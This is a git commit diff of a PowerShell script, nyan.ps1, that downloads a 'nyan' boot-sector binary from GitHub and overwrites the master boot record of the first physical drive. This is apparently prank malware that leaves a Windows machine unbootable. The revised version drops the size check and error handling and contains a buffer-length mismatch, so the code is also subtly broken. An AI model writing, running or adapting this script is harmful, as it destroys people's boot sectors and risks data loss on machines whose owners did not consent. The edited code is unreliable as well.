b8986e8e720f64a94956b955ad7c4d05e5dc692d
Philos <146400577+Phil-OS@users.noreply.github.com>
2025-10-05 13:06:57 -0400

    Update nyan.ps1

--- nyan.ps1
+++ nyan.ps1
@@ -1,34 +1,24 @@
 # Download raw nyan.mbr binary (512 bytes)
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/brainsmoke/nyanmbr/master/nyan.mbr' -OutFile "$env:TEMP\nyan.mbr" -UseBasicParsing
 
-# Read the bytes
+# Read the downloaded file
 $bootBytes = [System.IO.File]::ReadAllBytes("$env:TEMP\nyan.mbr")
 
-if ($bootBytes.Length -ne 512) {
-    throw "nyan.mbr is not 512 bytes (got $($bootBytes.Length))"
-}
+# Create a 446-byte boot code array
+$bootCode446 = New-Object byte[] 446
+[Array]::Copy($bootBytes, 0, $bootCode446, 0, $bootBytes.Length)  # copy existing bytes
+# remaining bytes (443..445) default to 0x00
 
-# Open physical drive 0
-$fs = New-Object System.IO.FileStream(
-    "\\.\PhysicalDrive0",
-    [System.IO.FileMode]::Open,
-    [System.IO.FileAccess]::ReadWrite,
-    [System.IO.FileShare]::ReadWrite
-)
+# Read existing MBR
+$fs = New-Object System.IO.FileStream("\\.\PhysicalDrive0", [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite)
+$sector = New-Object byte[] 512
+$fs.Read($sector,0,512) | Out-Null
 
-try {
-    # Read existing MBR
-    $sector = New-Object byte[] 512
-    $fs.Read($sector, 0, 512) | Out-Null
+# Copy padded boot code into MBR
+[Array]::Copy($bootCode446, 0, $sector, 0, 446)
 
-    # Overwrite just the first 446 bytes with nyan.mbr’s boot code
-    [Array]::Copy($bootBytes, 0, $sector, 0, 446)
-
-    # Seek back and write
-    $fs.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
-    $fs.Write($sector, 0, 512)
-    $fs.Flush()
-}
-finally {
-    $fs.Close()
-}
+# Write back
+$fs.Seek(0,[System.IO.SeekOrigin]::Begin) | Out-Null
+$fs.Write($sector,0,512)
+$fs.Flush()
+$fs.Close()
